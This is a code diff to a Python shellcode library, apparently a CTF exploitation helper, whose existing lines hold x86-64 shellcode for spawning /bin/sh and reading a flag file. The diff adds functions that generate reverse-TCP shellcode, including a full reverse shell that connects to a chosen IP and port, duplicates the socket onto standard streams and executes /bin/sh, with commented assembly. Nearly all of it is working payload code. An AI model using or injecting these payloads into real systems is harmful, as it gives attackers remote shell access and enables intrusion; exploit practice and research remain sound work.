@@ -8,7 +8,6 @@
 @Desc    : Sell convenient shellcodes
 '''
 
-
 __all__ = [
     "ShellcodeMall",
     "shellcode2unicode"
@@ -23,6 +22,92 @@ class ShellcodeMall:
         execve_bin_sh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
         cat_flag = "\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
         ls_current_dir = "\x68\x2f\x2e\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\x89\xe7\x31\xd2\xbe\x01\x01\x02\x01\x81\xf6\x01\x01\x03\x01\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x4e\x58\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x01\x58\x0f\x05"
+
+        @staticmethod
+        def reverse_tcp_connect(ip: str, port: int) -> bytes:
+            # from http://shell-storm.org/shellcode/files/shellcode-907.php
+            """
+            /* socket(AF_INET, SOCK_STREAM, 0) */
+            socket:
+                push 0x41
+                pop rax
+                cdq
+                push 2
+                pop rdi
+                push 1
+                pop rsi
+                syscall
+
+            /* connect(s, addr, len(addr))  */
+            connect:
+                xchg eax, edi
+                mov al, 42
+                mov rcx, 0x0100007f5c110002 /*127.0.0.1:4444 --> 0x7f000001:0x115c*/
+                push rcx
+                push rsp
+                pop rsi
+                mov dl, 16
+                syscall
+            """
+            int_ip = 0
+            for i in ip.strip().split("."):
+                int_ip <<= 8
+                int_ip |= int(i)
+            res = b"\x6a\x2a\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00"+ \
+                    port.to_bytes(2, "big") + int_ip.to_bytes(4, "big") + b"\x51\x54\x5e\xb2\x10\x0f\x05"
+            return res
+        
+        @staticmethod
+        def reverse_tcp_shell(ip: str, port: int) -> bytes:
+            # from http://shell-storm.org/shellcode/files/shellcode-907.php
+            """
+            /* socket(AF_INET, SOCK_STREAM, 0) */
+            socket:
+                push 0x41
+                pop rax
+                cdq
+                push 2
+                pop rdi
+                push 1
+                pop rsi
+                syscall
+
+            /* connect(s, addr, len(addr))  */
+            connect:
+                xchg eax, edi
+                mov al, 42
+                mov rcx, 0x0100007f5c110002 /*127.0.0.1:4444 --> 0x7f000001:0x115c*/
+                push rcx
+                push rsp
+                pop rsi
+                mov dl, 16
+                syscall
+            dup2:
+                push 3
+                pop rsi
+            dup2_loop:
+                mov al, 33
+                dec esi
+                syscall
+                jnz dup2_loop
+            execve:
+                cdq
+                mov al, 59
+                push rdx
+                mov rcx, 0x68732f6e69622f
+                push rcx
+                push rsp
+                pop rdi
+                syscall
+            """
+            int_ip = 0
+            for i in ip.strip().split("."):
+                int_ip <<= 8
+                int_ip |= int(i)
+            return b"\x6a\x41\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" + \
+            port.to_bytes(2, "big") + int_ip.to_bytes(4, "big") + \
+            b"\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x54\x5f\x0f\x05"
+
 
     class i386:
         __all_execve_bin_sh = {
